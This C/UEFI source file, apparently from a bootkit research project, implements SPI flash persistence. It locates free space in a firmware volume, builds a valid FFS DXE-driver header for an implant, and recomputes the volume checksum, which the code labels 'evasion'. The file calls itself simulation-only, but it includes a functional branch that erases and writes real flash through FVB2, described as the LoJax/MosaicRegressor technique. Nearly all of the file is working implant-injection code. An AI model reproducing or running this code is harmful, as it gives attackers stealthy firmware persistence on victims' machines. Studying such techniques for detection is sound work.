/** @file
  FV-Based Persistence - Implementation

  Models firmware volume injection used by real bootkits to achieve
  SPI flash persistence. Constructs valid FFS entries in FV free
  space so the DXE dispatcher loads the implant on next boot.

  SIMULATION ONLY — writes go through SPI flash emulator.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "FvPersistence.h"
#include "FvbFlashAccess.h"

//
// FFS file state bits for a valid, loadable file
//
#define FFS_FILE_STATE_VALID  (EFI_FILE_HEADER_CONSTRUCTION | \
                               EFI_FILE_HEADER_VALID | \
                               EFI_FILE_DATA_VALID)

//
// Default GUID for injected implant
//
STATIC EFI_GUID mDefaultImplantGuid = {
  0xDEADBEEF, 0x1337, 0x4242,
  { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11 }
};

/**
  Calculate FFS file header checksum.
**/
STATIC
UINT8
CalculateFfsChecksum8 (
  IN UINT8   *Buffer,
  IN UINTN   Size
  )
{
  UINT8   Sum;
  UINTN   Index;

  Sum = 0;
  for (Index = 0; Index < Size; Index++) {
    Sum = (UINT8)(Sum + Buffer[Index]);
  }

  return (UINT8)(0x100 - Sum);
}

EFI_STATUS
EFIAPI
InitializeFvPersistence (
  IN OUT FV_PERSISTENCE_CONTEXT  *Context,
  IN     UINT32                  FvBase,
  IN     UINT32                  FvSize
  )
{
  if (Context == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (FvSize == 0) {
    return EFI_INVALID_PARAMETER;
  }

  ZeroMem (Context, sizeof (FV_PERSISTENCE_CONTEXT));

  Context->FvBaseInFlash    = FvBase;
  Context->FvSize           = FvSize;
  Context->FvFreeSpaceOffset = 0;
  Context->FvFreeSpaceSize  = 0;
  Context->InjectionComplete = FALSE;
  Context->FvChecksumValid  = FALSE;
  Context->Initialized      = TRUE;

  CopyMem (&Context->InjectedFileGuid, &mDefaultImplantGuid, sizeof (EFI_GUID));

  DEBUG ((
    DEBUG_INFO,
    "[FvPersist] Initialized — Target FV at flash offset 0x%x (size 0x%x)\n",
    FvBase,
    FvSize
    ));

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
FindFvFreeSpace (
  IN  FV_PERSISTENCE_CONTEXT  *Context,
  IN  UINT8                   *FvData,
  IN  UINT32                  FvDataSize,
  OUT UINT32                  *FreeOffset,
  OUT UINT32                  *FreeSize
  )
{
  UINT32  Offset;
  UINT32  HeaderSize;
  UINT32  FreeStart;

  if (Context == NULL || !Context->Initialized) {
    return EFI_INVALID_PARAMETER;
  }

  if (FvData == NULL || FvDataSize == 0) {
    return EFI_INVALID_PARAMETER;
  }

  if (FreeOffset == NULL || FreeSize == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  //
  // Skip FV header (typically 0x48 bytes for standard EFI_FIRMWARE_VOLUME_HEADER)
  //
  HeaderSize = sizeof (EFI_FIRMWARE_VOLUME_HEADER) + sizeof (EFI_FV_BLOCK_MAP_ENTRY);
  if (HeaderSize >= FvDataSize) {
    return EFI_NOT_FOUND;
  }

  //
  // Scan from end of FV header looking for the start of 0xFF padding
  // (free space in a FV is filled with 0xFF per PI spec)
  //
  FreeStart = 0;

  for (Offset = HeaderSize; Offset < FvDataSize; Offset++) {
    if (FvData[Offset] == 0xFF) {
      if (FreeStart == 0) {
        FreeStart = Offset;
      }
    } else {
      FreeStart = 0;
    }
  }

  if (FreeStart == 0 || (FvDataSize - FreeStart) < sizeof (EFI_FFS_FILE_HEADER)) {
    DEBUG ((DEBUG_WARN, "[FvPersist] No usable free space in FV\n"));
    *FreeOffset = 0;
    *FreeSize = 0;
    return EFI_NOT_FOUND;
  }

  //
  // Align to 8-byte boundary (FFS files must be 8-byte aligned)
  //
  FreeStart = (FreeStart + 7) & ~7U;

  *FreeOffset = FreeStart;
  *FreeSize   = FvDataSize - FreeStart;

  Context->FvFreeSpaceOffset = FreeStart;
  Context->FvFreeSpaceSize   = *FreeSize;

  DEBUG ((
    DEBUG_INFO,
    "[FvPersist] Free space found: Offset=0x%x Size=0x%x (%d KB)\n",
    FreeStart,
    *FreeSize,
    *FreeSize / 1024
    ));

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ConstructFfsHeader (
  IN  EFI_GUID             *FileGuid,
  IN  UINT8                FileType,
  IN  UINT32               PayloadSize,
  OUT EFI_FFS_FILE_HEADER  *Header
  )
{
  UINT32  TotalSize;

  if (FileGuid == NULL || Header == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (PayloadSize == 0) {
    return EFI_INVALID_PARAMETER;
  }

  TotalSize = sizeof (EFI_FFS_FILE_HEADER) + PayloadSize;

  ZeroMem (Header, sizeof (EFI_FFS_FILE_HEADER));

  //
  // Set file GUID
  //
  CopyMem (&Header->Name, FileGuid, sizeof (EFI_GUID));

  //
  // Set file type and attributes
  //
  Header->Type = FileType;
  Header->Attributes = 0;

  //
  // Set size (24-bit field in FFS header)
  //
  Header->Size[0] = (UINT8)(TotalSize & 0xFF);
  Header->Size[1] = (UINT8)((TotalSize >> 8) & 0xFF);
  Header->Size[2] = (UINT8)((TotalSize >> 16) & 0xFF);

  //
  // Set state bits for a valid file
  //
  Header->State = FFS_FILE_STATE_VALID;

  //
  // Calculate header checksum (IntegrityCheck.Checksum.Header)
  // Covers entire header except State and IntegrityCheck.Checksum.File
  //
  Header->IntegrityCheck.Checksum.File = FFS_FIXED_CHECKSUM;
  Header->IntegrityCheck.Checksum.Header = 0;
  Header->IntegrityCheck.Checksum.Header = CalculateFfsChecksum8 (
    (UINT8 *)Header,
    sizeof (EFI_FFS_FILE_HEADER)
    );

  DEBUG ((
    DEBUG_INFO,
    "[FvPersist] FFS header constructed: Type=0x%x Size=0x%x\n",
    FileType,
    TotalSize
    ));

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
InjectFvPayload (
  IN FV_PERSISTENCE_CONTEXT  *Context,
  IN UINT8                   *Payload,
  IN UINT32                  PayloadSize,
  IN UINT8                   *FlashBuffer,
  IN UINT32                  FlashSize
  )
{
  EFI_FFS_FILE_HEADER  FfsHeader;
  EFI_STATUS           Status;
  UINT32               TotalSize;
  UINT32               WriteOffset;

  if (Context == NULL || !Context->Initialized) {
    return EFI_INVALID_PARAMETER;
  }

  if (Payload == NULL || PayloadSize == 0) {
    return EFI_INVALID_PARAMETER;
  }

  if (Context->InjectionComplete) {
    DEBUG ((DEBUG_WARN, "[FvPersist] Payload already injected\n"));
    return EFI_ALREADY_STARTED;
  }

  TotalSize = sizeof (EFI_FFS_FILE_HEADER) + PayloadSize;

  //
  // Verify free space is sufficient
  //
  if (Context->FvFreeSpaceSize < TotalSize) {
    DEBUG ((
      DEBUG_ERROR,
      "[FvPersist] Insufficient space: need 0x%x, have 0x%x\n",
      TotalSize,
      Context->FvFreeSpaceSize
      ));
    return EFI_BUFFER_TOO_SMALL;
  }

  //
  // Construct FFS header
  //
  Status = ConstructFfsHeader (
    &Context->InjectedFileGuid,
    FV_INJECT_TYPE_DXE_DRIVER,
    PayloadSize,
    &FfsHeader
    );

  if (EFI_ERROR (Status)) {
    return Status;
  }

  WriteOffset = Context->FvBaseInFlash + Context->FvFreeSpaceOffset;

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "[FvPersist] FV PAYLOAD INJECTION\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "  Flash offset:  0x%08x\n", WriteOffset));
  DEBUG ((DEBUG_INFO, "  FFS size:      0x%x (%d bytes)\n", TotalSize, TotalSize));
  DEBUG ((DEBUG_INFO, "  File type:     DXE_DRIVER (0x%x)\n", FV_INJECT_TYPE_DXE_DRIVER));
  DEBUG ((DEBUG_INFO, "  Technique:     FV free-space injection\n"));
  DEBUG ((DEBUG_INFO, "  Real-world:    LoJax, MosaicRegressor, ESPecter\n"));

  if (SIMULATION_MODE) {
    //
    // Simulation: write into the provided buffer (emulated flash)
    //
    if (FlashBuffer != NULL && (WriteOffset + TotalSize) <= FlashSize) {
      CopyMem (FlashBuffer + WriteOffset, &FfsHeader, sizeof (EFI_FFS_FILE_HEADER));
      CopyMem (
        FlashBuffer + WriteOffset + sizeof (EFI_FFS_FILE_HEADER),
        Payload,
        PayloadSize
        );
      DEBUG ((DEBUG_INFO, "  Status:        SIMULATED (written to emulated flash)\n"));
    } else {
      DEBUG ((DEBUG_INFO, "  Status:        SIMULATED (logged only, no buffer)\n"));
    }
  } else {
    //
    // Functional build: erase the target FFS extent and program the
    // real flash through FVB2 — the exact LoJax/MosaicRegressor
    // persistence technique.
    //
    Status = FvbEraseRange (WriteOffset, TotalSize);
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[FvPersist] FVB2 erase failed: %r\n", Status));
      return Status;
    }

    Status = FvbWriteRange (WriteOffset, sizeof (EFI_FFS_FILE_HEADER), (UINT8 *)&FfsHeader);
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[FvPersist] FVB2 header write failed: %r\n", Status));
      return Status;
    }

    Status = FvbWriteRange (
               WriteOffset + sizeof (EFI_FFS_FILE_HEADER),
               PayloadSize,
               Payload
               );
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[FvPersist] FVB2 payload write failed: %r\n", Status));
      return Status;
    }

    if (FlashBuffer != NULL && (WriteOffset + TotalSize) <= FlashSize) {
      CopyMem (FlashBuffer + WriteOffset, &FfsHeader, sizeof (EFI_FFS_FILE_HEADER));
      CopyMem (
        FlashBuffer + WriteOffset + sizeof (EFI_FFS_FILE_HEADER),
        Payload,
        PayloadSize
        );
    }

    DEBUG ((DEBUG_INFO, "  Status:        WRITTEN VIA FVB2 (functional)\n"));
  }

  DEBUG ((DEBUG_INFO, "==========================================\n\n"));

  Context->InjectedFileSize  = TotalSize;
  Context->InjectedFileType  = FV_INJECT_TYPE_DXE_DRIVER;
  Context->InjectionComplete = TRUE;

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ValidateFvIntegrity (
  IN FV_PERSISTENCE_CONTEXT  *Context,
  IN UINT8                   *FlashBuffer,
  IN UINT32                  FlashSize
  )
{
  EFI_FIRMWARE_VOLUME_HEADER  *FvHeader;
  UINT16                      Checksum;
  UINT16                      *Ptr;
  UINTN                       Index;
  UINTN                       HeaderWords;

  if (Context == NULL || !Context->Initialized) {
    return EFI_INVALID_PARAMETER;
  }

  if (FlashBuffer == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (Context->FvBaseInFlash + sizeof (EFI_FIRMWARE_VOLUME_HEADER) > FlashSize) {
    return EFI_INVALID_PARAMETER;
  }

  FvHeader = (EFI_FIRMWARE_VOLUME_HEADER *)(FlashBuffer + Context->FvBaseInFlash);

  //
  // Save original checksum
  //
  Context->OriginalFvChecksum = FvHeader->Checksum;

  //
  // Recalculate FV header checksum (16-bit sum of header words must be 0)
  //
  FvHeader->Checksum = 0;
  Checksum = 0;
  Ptr = (UINT16 *)FvHeader;
  HeaderWords = FvHeader->HeaderLength / 2;

  for (Index = 0; Index < HeaderWords; Index++) {
    Checksum = (UINT16)(Checksum + Ptr[Index]);
  }

  FvHeader->Checksum = (UINT16)(0x10000 - Checksum);
  Context->FvChecksumValid = TRUE;

  DEBUG ((
    DEBUG_INFO,
    "[FvPersist] FV checksum updated: 0x%04x -> 0x%04x (evasion)\n",
    Context->OriginalFvChecksum,
    FvHeader->Checksum
    ));

  return EFI_SUCCESS;
}

VOID
EFIAPI
LogFvPersistenceStatus (
  IN FV_PERSISTENCE_CONTEXT  *Context
  )
{
  if (Context == NULL || !Context->Initialized) {
    return;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[FvPersist] Status Report\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "  Target FV:       Offset 0x%08x, Size 0x%x\n",
    Context->FvBaseInFlash, Context->FvSize));
  DEBUG ((DEBUG_INFO, "  Free Space:      Offset 0x%x, Size 0x%x\n",
    Context->FvFreeSpaceOffset, Context->FvFreeSpaceSize));
  DEBUG ((DEBUG_INFO, "  Injected:        %a\n",
    Context->InjectionComplete ? "YES" : "NO"));

  if (Context->InjectionComplete) {
    DEBUG ((DEBUG_INFO, "  Injected Size:   0x%x bytes\n", Context->InjectedFileSize));
    DEBUG ((DEBUG_INFO, "  File Type:       0x%x\n", Context->InjectedFileType));
    DEBUG ((DEBUG_INFO, "  Checksum Fixed:  %a\n",
      Context->FvChecksumValid ? "YES" : "NO"));
    DEBUG ((DEBUG_INFO, "\n"));
    DEBUG ((DEBUG_INFO, "  [!] DETECTION INDICATORS:\n"));
    DEBUG ((DEBUG_INFO, "      - Unknown FFS GUID in DXE FV\n"));
    DEBUG ((DEBUG_INFO, "      - FV checksum differs from golden image\n"));
    DEBUG ((DEBUG_INFO, "      - File in previously-free space (was 0xFF)\n"));
  }

  DEBUG ((DEBUG_INFO, "========================================\n\n"));
}
